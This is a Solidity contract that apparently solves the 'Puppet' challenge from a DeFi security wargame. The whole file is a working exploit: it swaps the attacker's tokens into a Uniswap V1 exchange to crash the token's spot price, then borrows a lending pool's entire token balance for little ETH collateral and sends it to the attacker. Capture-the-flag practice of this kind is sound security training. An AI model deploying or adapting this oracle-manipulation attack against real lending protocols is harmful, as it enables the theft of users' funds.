// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IUniswapV1 {
    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256 eth_bought);
}

interface IPuppetPool {
    function calculateDepositRequired(
        uint256 amount
    ) external view returns (uint256);

    function borrow(uint256 amount, address recipient) external payable;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

contract PuppetAttacker {
    uint256 public constant POOL_INITIAL_TOKEN_BALANCE = 100_000 ether;
    uint256 public constant PLAYER_INITIAL_TOKEN_BALANCE = 1_000 ether;

    address public puppetPool;
    address public uniswapExchange;
    address public token;
    address public attacker;

    constructor(
        address _puppetPool,
        address _uniswapExchange,
        address _token,
        address _attacker
    ) {
        puppetPool = _puppetPool;
        uniswapExchange = _uniswapExchange;
        token = _token;
        attacker = _attacker;
    }

    function attack() public payable {
        IERC20(token).transferFrom(
            attacker,
            address(this),
            PLAYER_INITIAL_TOKEN_BALANCE
        );

        require(
            IERC20(token).balanceOf(address(this)) ==
                PLAYER_INITIAL_TOKEN_BALANCE,
            "Token balance is wrong"
        );

        IERC20(token).approve(uniswapExchange, PLAYER_INITIAL_TOKEN_BALANCE);

        uint256 balanceBefore = address(this).balance;
        uint256 ethBought = IUniswapV1(uniswapExchange).tokenToEthSwapInput(
            PLAYER_INITIAL_TOKEN_BALANCE,
            1, // min_eth is required to be greater than 0
            block.timestamp * 2
        );
        require(IERC20(token).balanceOf(address(this)) == 0, "Swap failed");
        require(
            address(this).balance == balanceBefore + ethBought,
            "Swap failed"
        );

        require(
            address(this).balance >=
                IPuppetPool(puppetPool).calculateDepositRequired(
                    POOL_INITIAL_TOKEN_BALANCE
                )
        );
        IPuppetPool(puppetPool).borrow{value: address(this).balance}(
            POOL_INITIAL_TOKEN_BALANCE,
            attacker
        );
    }

    receive() external payable {}
}
